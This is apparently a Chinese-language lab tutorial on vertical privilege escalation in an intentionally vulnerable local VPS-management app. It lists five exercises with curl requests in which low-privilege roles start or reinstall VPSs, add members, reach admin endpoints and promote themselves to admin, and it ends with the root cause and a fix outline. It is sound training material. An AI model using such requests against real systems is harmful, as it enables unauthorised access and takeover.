# 教程 03: 垂直越权

## 概念

**垂直越权**是指低权限用户可以通过某些方式执行高权限操作。通常表现为前端界面隐藏了操作按钮，但后端接口没有做权限校验。

**难度**: ★★☆ (进阶)

## 漏洞列表

### V-01: 只读成员控制 VPS 启停

**目标**: 使用 `acme_viewer` 或 `globex_viewer` 角色启动/停止 VPS。

1. 使用 `acme_viewer` / `pass123` 或 `globex_viewer` / `pass123` 登录
2. 界面上看不到 VPS 的启动/停止按钮
3. 使用其他账户（如 acme_admin）获取一个 VPS ID
4. 直接调用启停接口:

```bash
curl -X POST http://localhost:8080/api/v1/vps/1/start \
  -H "Authorization: Bearer <viewer-token>"
```

**预期结果**: VPS 被成功启动。

### V-02: 运维人员添加企业成员

```bash
curl -X POST http://localhost:8080/api/v1/company/members \
  -H "Authorization: Bearer <ops-token>" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass123","email":"h@h.com","role":"viewer"}'
```

### V-03: 财务人员重装 VPS 系统

```bash
curl -X POST http://localhost:8080/api/v1/vps/1/reinstall \
  -H "Authorization: Bearer <finance-token>" \
  -H "Content-Type: application/json" \
  -d '{"os_image":"kali-linux"}'
```

也可使用 `globex_finance` / `pass123` 进行测试。

### V-04: 个人用户调用平台管理接口

```bash
curl http://localhost:8080/api/v1/admin/users \
  -H "Authorization: Bearer <alice-token>"
```

### V-05: 运维自升为管理员

```bash
# 先获取自身用户 ID
curl http://localhost:8080/api/v1/user/profile \
  -H "Authorization: Bearer <ops-token>"

# 修改自身角色为 admin
curl -X PUT http://localhost:8080/api/v1/company/members/<your-id>/role \
  -H "Authorization: Bearer <ops-token>" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

## 核心原理

前端通过 `v-if` 隐藏按钮，但这只是 UI 层面的限制。如果后端没有严格校验用户角色和权限，攻击者可以直接调用隐藏接口。

## 修复方案

在安全模式下，中间件和服务层会双重校验：

```go
// Middleware: RequirePermission(PermVPSManage)
// Service: check if user role allows this action
```

→ [教程 04: 上下文越权](04-context-escalation.md)
